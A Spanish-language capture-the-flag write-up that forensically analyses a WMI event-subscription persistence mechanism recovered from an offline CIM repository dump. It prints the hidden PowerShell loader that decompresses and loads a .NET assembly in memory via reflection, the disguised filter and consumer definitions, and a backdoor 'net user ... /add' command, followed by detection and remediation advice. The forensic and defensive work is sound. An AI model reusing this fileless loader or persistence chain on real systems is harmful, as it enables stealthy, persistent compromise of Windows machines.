After Hours — Persistencia oculta vía WMI Event Subscription y payload .NET en memoria

Se analizó offline un volcado parcial del repositorio CIM de WMI para identificar un mecanismo de persistencia invisible a Startup, Scheduled Tasks y claves Run del registro. Una suscripción de eventos WMI disfrazada de telemetría de hardware ejecutaba PowerShell oculto cada media hora, cargando un ensamblado .NET completo desde el valor por defecto de una propiedad de una clase WMI custom sin instancias.

Reconocimiento

El material entregado consistía en cinco archivos sin extensión reconocible a simple vista: INDEX.BTR, OBJECTS.DATA, MAPPING1.MAP, MAPPING2.MAP y MAPPING3.MAP. El briefing indicaba que un proceso back-office se estaba autenticando fuera de horario, y que la persistencia responsable no aparecía en ninguno de los lugares habituales de revisión.

file INDEX.BTR OBJECTS.DATA MAPPING1.MAP MAPPING2.MAP MAPPING3.MAP
→ data (genérico, sin firma reconocida por `file`)

Un hexdump de INDEX.BTR reveló cadenas del tipo CI_41C53E6DB1ACF2453CEFD41398198E613, un patrón CI_<hash> característico del repositorio CIM (Common Information Model) de WMI. La combinación exacta de archivos —índice B-tree, blob de objetos y tres tablas de mapeo triple-buffered para journaling— corresponde a la estructura estándar de:

%windir%\System32\wbem\Repository\

Esto confirmó la pista narrativa del reto: WMI no es un mecanismo que Autoruns, Task Scheduler o las claves Run cubran por defecto, salvo que se inspeccione explícitamente el namespace root\subscription.

Vulnerabilidad identificada

Se identificó una técnica de persistencia vía Permanent WMI Event Subscription combinada con una técnica de ocultamiento de payload poco habitual:

  • Suscripción WMI camuflada: un __EventFilter + CommandLineEventConsumer en root\subscription, con nombres que imitan telemetría legítima de hardware/motor, disparaba PowerShell oculto cada 60 segundos al detectar que el minuto del reloj del sistema era 30.
  • Payload fuera de la suscripción: el comando ejecutado no contenía el payload malicioso embebido — lo leía desde una clase WMI custom sin instancias (Win32_HardwareTelemetry), usando el valor por defecto de una propiedad (ConfigData) como contenedor de datos. Esto lo hace invisible a cualquier herramienta que solo liste instancias o inspeccione filters/consumers/bindings sin resolver definiciones de clase.
  • Carga en memoria: el payload, una vez descomprimido, resultó ser un ensamblado .NET completo cargado vía Reflection.Assembly.Load() e invocado directamente, sin tocar disco ni generar un proceso hijo visible más allá del powershell.exe inicial.
  • Anti-análisis por hostname: el ensamblado comparaba Environment.MachineName contra un valor hardcodeado antes de ejecutar su carga real, abortando en cualquier entorno distinto al objetivo.
Nota: Ninguna herramienta estándar de listado de artefactos WMI (ni siquiera Autoruns, salvo activando explícitamente su pestaña de WMI) resuelve automáticamente clases custom sin instancias. El único método que expuso el payload completo fue el parseo manual y offline del repositorio CIM, archivo por archivo.

Explotación (PoC)

Paso 1 — Parseo del repositorio CIM. No existe una herramienta nativa de Windows para leer estos archivos offline, así que se utilizó python-cim (proyecto flare-wmi, FireEye / Willi Ballenthin), un parser puro en Python del formato CIM:

git clone https://github.com/fireeye/flare-wmi.git
cd flare-wmi/python-cim
pip install funcy hexdump intervaltree vivisect-vstruct-wb
pip install -e .
from cim import CIM
from cim.objects import Namespace

c = CIM("win7", "/ruta/a/los/archivos")

Paso 2 — Enumeración de namespaces y clases con instancias. Se recorrió el árbol completo descartando ruido de clases del sistema (__Namespace, __Win32Provider, MSFT_*, RSOP_*...). El namespace clave resultó ser root\subscription, donde vive todo lo relacionado a Permanent WMI Event Subscriptions:

CLASS: __EventFilter (2 instances)
CLASS: __FilterToConsumerBinding (1 instances)
CLASS: NTEventLogEventConsumer (1 instances)
CLASS: CommandLineEventConsumer (1 instances)

De las dos instancias de __EventFilter, una era legítima (SCM Event Log Filter). La segunda no:

__EventFilter.Name = "EngineTelemetryFilter"
  EventNamespace = root\cimv2
  Query          = SELECT * FROM __InstanceModificationEvent WITHIN 60
                    WHERE TargetInstance ISA 'Win32_LocalTime'
                    AND TargetInstance.Minute = 30
  QueryLanguage  = WQL

Es decir: se disparaba cada hora, en el minuto 30, sondeando cada 60 segundos — exactamente el patrón de "logins en la madrugada" descrito en el brief. El consumer asociado:

CommandLineEventConsumer.Name = "EngineTelemetryConsumer"
  CommandLineTemplate = cmd /C powershell.exe -Sta -Nop -Window Hidden -enc <Base64>

Paso 3 — Decodificación del comando PowerShell. El bloque -enc se codifica en Base64 sobre UTF-16LE:

import base64
raw = base64.b64decode(b64_string)
print(raw.decode("utf-16le"))
$file = ([WmiClass]'ROOT\cimv2:Win32_HardwareTelemetry').Properties['ConfigData'].Value;
$o = New-Object IO.MemoryStream;
$d = New-Object IO.Compression.DeflateStream(
        [IO.MemoryStream][Convert]::FromBase64String($file),
        [IO.Compression.CompressionMode]::Decompress);
$b = New-Object Byte[](1024);
$r = $d.Read($b,0,1024);
while($r -gt 0){
    $o.Write($b,0,$r);
    $r = $d.Read($b,0,1024);
}
[Reflection.Assembly]::Load($o.ToArray()).EntryPoint.Invoke($null,@(,[string[]]@()))|Out-Null

Esto confirmó que la configuración maliciosa no vivía en el consumer ni en el filter, sino en una clase WMI custom (Win32_HardwareTelemetry) con una propiedad (ConfigData) actuando como contenedor de un payload comprimido.

Paso 4 — Localización de la clase maliciosa y extracción del payload. Win32_HardwareTelemetry no tenía instancias — por eso no aparecía en el listado normal del Paso 2. El valor vivía como default value de la propiedad en la propia definición de la clase:

with Namespace(c, "root\\cimv2") as ns:
    cd = ns.class_("Win32_HardwareTelemetry")
    prop = cd.cl.properties["ConfigData"]
    payload_b64 = prop.default_value   # ~2.2 KB de texto Base64
import base64, zlib

raw = base64.b64decode(payload_b64)          # 1658 bytes comprimidos
data = zlib.decompress(raw, -15)              # raw DEFLATE (sin header zlib)
open("payload.bin", "wb").write(data)         # 4096 bytes
file payload.bin
# PE32 executable (GUI) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections

El payload resultó ser un ensamblado .NET completo (updates.exe), con una clase interna AfterHours, diseñado para cargarse en memoria vía reflection sin tocar disco.

Paso 5 — Extracción de la flag. El análisis de strings UTF-16LE del binario reveló el mecanismo de anti-análisis y el dato final:

strings -e l -n 4 payload.bin
bytelotusdc
cmd.exe
/c net user patch VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9 /add
Execution halted: Environment mismatch.

El ensamblado comparaba Environment.MachineName contra "bytelotusdc" — un chequeo de entorno anti-sandbox: si el hostname no coincidía, el binario abortaba con "Environment mismatch" sin ejecutar la carga real. Si coincidía, creaba un usuario local patch cuya "contraseña" era en realidad la flag codificada en Base64:

import base64
base64.b64decode("VEhNe1A0dGNoX29wM25lZF90aDNfQmFjS2QwMHJ9").decode()
# THM{P4tch_op3ned_th3_BacKd00r}
Flag: THM{P4tch_op3ned_th3_BacKd00r}

Post-explotación / impacto

La cadena completa de persistencia, resumida:

Win32_LocalTime.Minute == 30            (trigger cada 60s)
        │
        ▼
__EventFilter "EngineTelemetryFilter"   (root\subscription)
        │
        ▼
__FilterToConsumerBinding
        │
        ▼
CommandLineEventConsumer "EngineTelemetryConsumer"
   → powershell.exe -enc <b64/utf16le>
        │
        ▼
Lee Win32_HardwareTelemetry.ConfigData  (root\cimv2, sin instancias — valor por defecto)
        │
        ▼
Base64 → DeflateStream.Decompress → ensamblado .NET en memoria
        │
        ▼
Reflection.Assembly.Load(...).EntryPoint.Invoke()
        │
        ▼
Chequeo de hostname == "bytelotusdc" (anti-análisis)
        │
        ▼
net user patch <flag en Base64> /add   (persistencia adicional: cuenta local)

El impacto en un entorno real sería severo: un atacante logró persistencia de ejecución de código completamente invisible a los mecanismos de revisión estándar, con ejecución periódica automática (cada hora) y una segunda capa de persistencia (cuenta local patch) como respaldo. La técnica de anti-análisis por hostname además dificulta la detección en sandboxes de análisis automatizado, ya que el payload real solo se activa en el entorno objetivo específico.

Mecanismo revisado por herramientas típicas ¿Detecta esta persistencia?
Carpeta StartupNo aplica
Registro Run / RunOnceNo aplica
Task SchedulerNo aplica
Autoruns (vista por defecto)Solo si se activa explícitamente la pestaña WMI

Remediación

  • Auditar root\subscription explícitamente: incluir la revisión de __EventFilter, __EventConsumer y __FilterToConsumerBinding como paso estándar en cualquier análisis de persistencia en Windows, no solo Startup/Run/Tasks.
  • Habilitar el módulo WMI de Autoruns (o herramientas equivalentes como Get-WmiObject -Namespace root\subscription -Class __EventFilter) de forma rutinaria, no como paso opcional.
  • Monitorear la creación de clases WMI custom: el Event ID 5861 (Sysmon/WMI activity) y los logs de Microsoft-Windows-WMI-Activity/Operational registran la creación de __EventFilter, consumers y bindings en tiempo real; alertar sobre nuevas suscripciones permanentes fuera de un baseline conocido.
  • Restringir la creación de namespaces/clases custom en root\cimv2: aplicar control de acceso (DCOM/WMI ACLs) para limitar qué cuentas pueden definir nuevas clases WMI, reduciendo la superficie para este tipo de contenedor encubierto.
  • Detección de reflection en memoria: instrumentar EDR/AMSI para detectar patrones de Reflection.Assembly.Load combinados con streams de descompresión invocados desde PowerShell, un patrón de carga de payload en memoria (fileless) frecuente más allá de este caso puntual.
  • Análisis forense offline del repositorio CIM como parte de la respuesta a incidentes cuando se sospeche persistencia WMI, dado que es el único método confiable para exponer datos ocultos en valores por defecto de propiedades de clase.

Lecciones aprendidas

Este reto ilustra un nivel de sigilo poco frecuente en retos de persistencia: no basta con encontrar el trigger (el __EventFilter y el consumer), porque el payload real ni siquiera vive ahí. Un atacante con buen entendimiento del modelo de objetos de WMI puede usar una clase completamente custom, sin instancias, y esconder datos arbitrarios en el valor por defecto de una propiedad a nivel de definición de clase — un lugar que la gran mayoría de herramientas de triage automatizado ni siquiera consulta, porque no es un "objeto" en el sentido tradicional.

También refuerza que el análisis offline y manual del repositorio CIM, archivo por archivo con un parser como python-cim, sigue siendo insustituible cuando se sospecha de persistencia WMI avanzada: los volcados automatizados y las vistas por defecto de herramientas como Autoruns cubren el caso común, pero no garantizan visibilidad sobre clases custom sin instancias.

Por último, el chequeo de hostname como gate de ejecución es un recordatorio de que el malware moderno no siempre intenta ocultar que existe, sino que apuesta a que un analista trabajando fuera del entorno objetivo original nunca vea la carga real ejecutarse — la evasión no siempre es evitar la detección estática, a veces es simplemente negarse a "actuar" fuera de contexto.
